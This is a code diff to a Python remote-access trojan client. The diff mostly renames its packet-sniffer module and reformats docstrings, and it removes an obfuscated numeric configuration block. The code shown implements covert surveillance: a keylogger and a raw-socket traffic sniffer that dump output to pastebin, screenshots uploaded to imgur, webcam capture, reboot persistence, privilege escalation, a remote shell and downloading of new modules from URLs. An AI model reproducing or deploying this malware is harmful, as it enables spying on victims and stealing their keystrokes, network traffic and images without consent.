@@ -100,7 +100,7 @@ class Client(object):
 
     # ------------------- private functions -------------------------
 
-    def _help(self, *arg): return self._show({cmd: self._commands[cmd].func_doc for cmd in self._commands}) if not arg else self._help_command(arg[0])
+    def _help(self, *arg): print '\n'.join(['{}{:>90}'.format(x[0], x[1]) for x in {cmd: self._commands[cmd].func_doc for cmd in self._commands}.items()]) if not arg else self._help_command(arg[0])
 
     def _help_command(self, cmd): return getattr(self, cmd).func_doc if bool(len(cmd) and cmd in self._commands) else "'{}' not found".format(cmd)
     
@@ -169,12 +169,12 @@ class Client(object):
             self._result['webcam']['image'][time.ctime()] = result
         return result
 
-    def _packetsniffer(self):
+    def _packetsniff(self):
         try:
-            result  = self._packetsniffer_manager(self.packetsniffer.options['seconds'])
+            result  = self._packetsniff_manager(self.packetsniff.options['seconds'])
         except Exception as e:
             result  = 'Error monitoring network traffic: {}'.format(str(e))
-        self._result['packetsniffer'].update({ time.ctime() : result })
+        self._result['packetsniff'].update({ time.ctime() : result })
         return result
 
     def _hidden_process(self, path, shell=False):
@@ -385,7 +385,7 @@ class Client(object):
             fx.platforms = ['win32']
             fx.options = {'image': True, 'video': bool()}
 
-        elif fx.func_name is 'packetsniffer':
+        elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
             fx.options  = { 'next_upload': time.time() + 300.0, 'buffer': []}
 
@@ -413,14 +413,14 @@ class Client(object):
             
     def _show(self, target):
         try:
-            results = json.dumps(target, indent=2, separators=(',','\t'), sort_keys=True)
+            results = json.dumps(target, indent=2, separators=(',','\t\t'), sort_keys=True)
         except:
             try:
                 string_repr = repr(target)
                 string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
                 string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
                 string_repr = string_repr.replace('(', '[').replace(')', ']')
-                results     = json.dumps(json.loads(string_repr), indent=2, separators=(',', '\t'), sort_keys=True)
+                results     = json.dumps(json.loads(string_repr), indent=2, separators=(',', '\t\t'), sort_keys=True)
             except:
                 results = repr(target)
         return results
@@ -523,7 +523,7 @@ class Client(object):
             if not worker.is_alive():
                 worker.start()
         for task, worker in self._threads.items():
-            if task not in ('keylogger','packetsniffer'):
+            if task not in ('keylogger','packetsniff'):
                 worker.join()
         return self._show(self._result)
 
@@ -654,9 +654,9 @@ class Client(object):
         result = self._ftp(fpath)
         return result
 
-# ------------------- packetsniffer -------------------------
+# ------------------- packetsniff -------------------------
 
-    def _packetsniffer_udp_header(self, data):
+    def _packetsniff_udp_header(self, data):
         try:
             udp_hdr = struct.unpack('!4H', data[:8])
             src     = udp_hdr[0]
@@ -664,18 +664,18 @@ class Client(object):
             length  = udp_hdr[2]
             chksum  = udp_hdr[3]
             data    = data[8:]
-            self.packetsniffer.options['buffer'].append('|================== UDP HEADER ==================|')
-            self.packetsniffer.options['buffer'].append('|================================================|')
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Source', src))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Length', length))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
-            self.packetsniffer.options['buffer'].append('|================================================|')
+            self.packetsniff.options['buffer'].append('|================== UDP HEADER ==================|')
+            self.packetsniff.options['buffer'].append('|================================================|')
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Source', src))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Length', length))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
+            self.packetsniff.options['buffer'].append('|================================================|')
             return data
         except Exception as e:
-            self.packetsniffer.options['buffer'].append("Error in {} header: '{}'".format('UDP', str(e)))
+            self.packetsniff.options['buffer'].append("Error in {} header: '{}'".format('UDP', str(e)))
 
-    def _packetsniffer_tcp_header(self, recv_data):
+    def _packetsniff_tcp_header(self, recv_data):
         try:
             tcp_hdr  = struct.unpack('!2H2I4H', recv_data[:20])
             src_port = tcp_hdr[0]
@@ -698,22 +698,22 @@ class Client(object):
             urg_pnt = tcp_hdr[7]
             recv_data = recv_data[20:]
 
-            self.packetsniffer.options['buffer'].append('|================== TCP HEADER ==================|')
-            self.packetsniffer.options['buffer'].append('|================================================|')
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Window', win))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
-            self.packetsniffer.options['buffer'].append('|================================================|')
+            self.packetsniff.options['buffer'].append('|================== TCP HEADER ==================|')
+            self.packetsniff.options['buffer'].append('|================================================|')
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Window', win))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
+            self.packetsniff.options['buffer'].append('|================================================|')
             return recv_data
         except Exception as e:
-            self.packetsniffer.options['buffer'].append("Error in {} header: '{}'".format('TCP', str(e)))
+            self.packetsniff.options['buffer'].append("Error in {} header: '{}'".format('TCP', str(e)))
 
-    def _packetsniffer_ip_header(self, data):
+    def _packetsniff_ip_header(self, data):
         try:
             ip_hdr  = struct.unpack('!6H4s4s', data[:20]) 
             ver     = ip_hdr[0] >> 12
@@ -730,27 +730,27 @@ class Client(object):
             dest    = socket.inet_ntoa(ip_hdr[7])
             data    = data[20:]
 
-            self.packetsniffer.options['buffer'].append('|================== IP HEADER ===================|')
-            self.packetsniffer.options['buffer'].append('|================================================|')
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('VER', ver))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t |'.format('Source IP', src))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
-            self.packetsniffer.options['buffer'].append('|================================================|')
+            self.packetsniff.options['buffer'].append('|================== IP HEADER ===================|')
+            self.packetsniff.options['buffer'].append('|================================================|')
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('VER', ver))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t |'.format('Source IP', src))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
+            self.packetsniff.options['buffer'].append('|================================================|')
             return data, ipproto
         except Exception as e:
-            self.packetsniffer.options['buffer'].append("Error in {} header: '{}'".format('IP', str(e)))
+            self.packetsniff.options['buffer'].append("Error in {} header: '{}'".format('IP', str(e)))
 
 
-    def _packetsniffer_eth_header(self, data):
+    def _packetsniff_eth_header(self, data):
         try:
             ip_bool = False
             eth_hdr = struct.unpack('!6s6sH', data[:14])
@@ -758,41 +758,41 @@ class Client(object):
             src_mac = binascii.hexlify(eth_hdr[1])
             proto   = eth_hdr[2] >> 8
 
-            self.packetsniffer.options['buffer'].append('|================================================|')
-            self.packetsniffer.options['buffer'].append('|================== ETH HEADER ==================|')
-            self.packetsniffer.options['buffer'].append('|================================================|')
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
-            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
-            self.packetsniffer.options['buffer'].append('|================================================|')
+            self.packetsniff.options['buffer'].append('|================================================|')
+            self.packetsniff.options['buffer'].append('|================== ETH HEADER ==================|')
+            self.packetsniff.options['buffer'].append('|================================================|')
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
+            self.packetsniff.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
+            self.packetsniff.options['buffer'].append('|================================================|')
 
             if proto == 8:
                 ip_bool = True
             data = data[14:]
             return data, ip_bool
         except Exception as e:
-            self.packetsniffer.options['buffer'].append("Error in {} header: '{}'".format('ETH', str(e)))
+            self.packetsniff.options['buffer'].append("Error in {} header: '{}'".format('ETH', str(e)))
 
-    def _packetsniffer_manager(self, seconds):
+    def _packetsniff_manager(self, seconds):
         limit = time.time() + float(seconds)
         sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
         while time.time() < limit:
             try:
                 recv_data = sniffer_socket.recv(2048)
-                recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
+                recv_data, ip_bool = self._packetsniff_eth_header(recv_data)
                 if ip_bool:
-                    recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
+                    recv_data, ip_proto = self._packetsniff_ip_header(recv_data)
                     if ip_proto == 6:
-                        recv_data = self._packetsniffer_tcp_header(recv_data)
+                        recv_data = self._packetsniff_tcp_header(recv_data)
                     elif ip_proto == 17:
-                        recv_data = self._packetsniffer_udp_header(recv_data)
+                        recv_data = self._packetsniff_udp_header(recv_data)
             except: break
         try:
             sniffer_socket.close()
         except: pass
-        result = self._pastebin('\n'.join(self.packetsniffer.options['buffer']))
-        self._result['packetsniffer'][time.ctime()] = result
-        self.packetsniffer.options['buffer'] = []
+        result = self._pastebin('\n'.join(self.packetsniff.options['buffer']))
+        self._result['packetsniff'][time.ctime()] = result
+        self.packetsniff.options['buffer'] = []
         return result
 
 # ------------------- persistence -------------------------
@@ -956,161 +956,224 @@ class Client(object):
 
     @_command
     def pwd(self):
-        "usage:\t\tpwd\ndescription:\tpresent working directory"
+        """
+        usage:          pwd
+        description:    present working directory
+        """
         return os.getcwd()
 
     @_command
     def run(self):
-        "usage:\t\trun\ndescription:\trun enabled client modules"
+        """
+        usage:          run
+        description:    run enabled client modules
+        """
         return self._run()
 
     @_command
     def kill(self):
-        "usage:\t\tkill\ndescription:\tkill client"
+        """
+        usage:          kill
+        description:    kill client
+        """
         return self._kill()
 
     @_command
     def cd(self, *x):
-        "usage:\t\tcd <path>\ndescription:\tchange directory"
+        """
+        usage:          cd <path>
+        description:    change directory
+        """
         return self._cd(*x)
 
     @_command
     def set(self, x):
-        "usage:\t\tset <module> [option]=[value]\ndescription:\tset module options"
+        """
+        usage:          set <module> [option]=[value]
+        description:    set module options
+        """
         return self._set(x)
 
     @_command
     def ls(self, *x):
-        "usage:\t\tls <path>\ndescription:\tlist directory contents"
+        """
+        usage:          ls <path>
+        description:    list directory contents
+        """
         return self._ls(*x)
 
     @_command
     def admin(self):
-        "usage:\t\tadmin\ndescription:\tattempt to escalate privileges"
+        """
+        usage:          admin
+        description:    attempt to escalate privileges
+        """
         return self._admin()
     
     @_command
     def start(self):
-        "usage:\t\tstart\ndescription:\tstart client"
+        """
+        usage:          start
+        description:    start client
+        """
         return self._start()
     
     @_command
     def shell(self):
-        "usage:\t\tshell\ndescription:\trun client shell "
+        """
+        usage:          shell
+        description:    run client shell
+        """
         return self._shell()
     
     @_command
     def new(self, x):
-        "usage:\t\tnew <url>\ndescription:\tdownload new module from url"
+        """
+        usage:          new <url>
+        description:    download new module from url
+        """
         return self._new(x)
 
     @_command
     def show(self, x):
-        "usage:\t\tshow <option>\ndescription:\tshow client attributes"
+        """
+        usage:          show <option>
+        description:    show client attributes
+        """
         return self._show(x)
 
     @_command
     def standby(self):
-        "usage:\t\tstandby\ndescription:\trevert to standby mode"
+        """
+        usage:          standby
+        description:    revert to standby mode
+        """
         return self._standby()
 
     @_command
     def wget(self, target):
-        "usage:\t\twget <url>\ndescription:\tdownload file from url"
+        """
+        usage:          wget <url>
+        description:    download file from url
+        """
         return self._wget()
 
     @_command
     def options(self,*arg):
-        "usage:\t\toptions\ndescription:\tdisplay module options"
+        """
+        usage:          options
+        description:    display module options
+        """
         return self._options(*arg)
 
     @_command
     def jobs(self):
-        "usage:\t\tjobs\ndescription:\tlist currently active jobs"
+        """
+        usage:          jobs
+        description:    list currently active jobs
+        """
         return self._show(self._threads)
     
     @_command
     def enable(self, module):
-        "usage:\t\tenable <module>\ndescription:\tenable module"
+        """
+        usage:          enable <module>
+        description:    enable module
+        """
         return self._enable(module)
 
     @_command
     def disable(self, module):
-        "usage:\t\tdisable <module>\ndescription:\tdisable module"
+        """
+        usage:          disable <module>
+        description:    disable module
+        """
         return self._disable(module)
 
     @_command
     def results(self):
-        "usage:\t\tresults\ndescription:\tshow all modules output"
+        """
+        usage:          results
+        description:    show all modules output
+        """
         return self._show(self._result)
 
     @_command
     def help(self, *args):
-        "usage:\t\thelp [option]\ndescription:\tshow command usage information"
+        """
+        usage:          help [option]
+        description:    show command usage information
+        """
         return self._help(args) if len(args) else self._help()
 
     @_command
     def info(self):
-        "usage:\t\tinfo\ndescription:\tget client host machine information"
+        """
+        usage:          info
+        description:    get client host machine information
+        """
         return self._show(self._info)
 
     @_command
     def commands(self):
-        "usage:\t\tcommands\ndescription:\tlist commands with usage help"
+        """
+        usage:          commands
+        description:    list commands with usage help
+        """
         return self._help_commands 
 
     @_command
     def modules(self):
-        "usage:\t\tmodules\ndescription:\tlist modules current status"
+        """
+        usage:          modules
+        description:    list modules current status
+        """
         return self._help_modules 
 
     @_module
     def webcam(self):
-        "usage:\t\twebcam\ndescription:\tremote image/video capture from client webcam"
+        """
+        usage:          webcam
+        description:    remote image/video capture from client webcam
+        """
         return self._webcam()
     
     @_module
     def keylogger(self):
-        "usage:\t\tkeylogger\ndescription:\tlog client keystrokes remotely and dump to pastebin"
+        """
+        usage:          keylogger
+        description:    log client keystrokes remotely and dump to pastebin
+        """
         return self._keylogger()
 
     @_module
     def screenshot(self):
-        "usage:\t\tscreenshot\ndescription:\ttake screenshot + upload to imgur"
+        """
+        usage:          screenshot
+        description:    take screenshot and upload to imgur
+        """
         return self._screenshot()
 
     @_module
     def persistence(self):
-        "usage:\t\tpersistence\ndescription:\testablish persistence to relaunch on reboot"
+        """
+        usage:          persistence
+        description:    establish persistence to relaunch on reboot
+        """
         return self._persistence()
     
     @_module
-    def packetsniffer(self):
-        "usage:\t\tpacketsniffer\ndescription:\tcapture client network traffic and dump to pastebin"
-        return self._packetsniffer()
+    def packetsniff(self):
+        """
+        usage:          packetsniff
+        description:    capture client network traffic and dump to pastebin
+        """
+        return self._packetsniff()
 
 # -----------------   main   --------------------------
 
 def main(*args, **kwargs):
     client = Client(**kwargs)
-    return client.start()
+    return client
 
-if __name__ == '__main__':
-    config = {
-            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
-            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
-            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
-            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
-            "__e__": "423224063517525567299427660991207813087967857812230603629111",
-            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
-            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
-            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
-            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
-            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
-            "__v__": "1",
-	    "__w__": "12095051301478169748777225282050429328988589300942044190524179185395659761404742",
-            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
-            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
-    }
-    main(**config)
 
